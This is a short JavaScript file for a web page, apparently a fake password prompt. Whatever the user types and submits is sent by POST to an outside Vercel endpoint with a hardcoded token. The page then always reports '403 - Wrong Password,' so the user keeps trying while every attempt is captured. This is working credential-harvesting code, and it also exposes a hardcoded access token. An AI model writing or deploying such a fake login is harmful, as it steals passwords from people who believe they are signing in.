var inputthing = document.getElementById('inputthing');
var errorr = document.getElementById('error_message')
inputthing.addEventListener("focus",function(){
    inputthing.value = ""
})

inputthing.addEventListener('keypress',function(e){
    if (e.key == 'Enter'){
        TheFunction()
    } 
})

function TheFunction(){
    //alert(inputthing.value);
    inputthing.blur();
    sendMessage(inputthing.value)
    inputthing.value = 'Password:'
    errorr.innerHTML = "403 - Wrong Password."
};


function sendMessage(message){
    fetch('https://gimcodes-j9qodbig3-campbatt.vercel.app/',{
        method:'POST',
        headers:{
            'Content-Type': 'application/json'
        },
        body:JSON.stringify({
            chat:message,
            user:"Test_Bot",
            token:"FPOYFwSuJDUYKZOaryIQxzrEJEEHvv"
        })})
};
